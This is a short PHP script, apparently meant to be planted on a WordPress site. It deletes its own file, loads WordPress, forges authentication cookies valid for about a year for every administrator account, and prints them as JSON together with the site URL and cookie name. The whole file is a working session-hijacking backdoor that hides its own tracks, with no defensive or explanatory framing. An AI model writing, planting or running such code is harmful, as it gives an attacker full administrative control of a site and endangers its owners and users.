<?php

@unlink(__FILE__);

if (!function_exists('wp_generate_auth_cookie')) {
    // wp_generate_auth_cookie function not found, load wordpress
    $dir = dirname(__FILE__);
    do {
        if (($res = @opendir($dir)) === false) {
            break;
        }
        @closedir($res);

        $tmp = $dir;
        if (@file_exists("$dir/wp-load.php")) {
            require_once "$dir/wp-load.php";
            break;
        }
    } while (($dir = @realpath("$dir/..")) && $tmp != $dir);
}

if (function_exists('wp_generate_auth_cookie')) {
    echo json_encode(array(
        '_TEST__MAPPING___START____' => '_START_',
        'site' => get_site_url(),
        'cookie' => AUTH_COOKIE,
        'auth' => array_map(function ($user) {
            return wp_generate_auth_cookie($user->ID, time() + 31556926, 'auth');
        }, get_users('role=administrator')),
        '_TEST__MAPPING___END____' => '_END_',
    ));
}

exit;
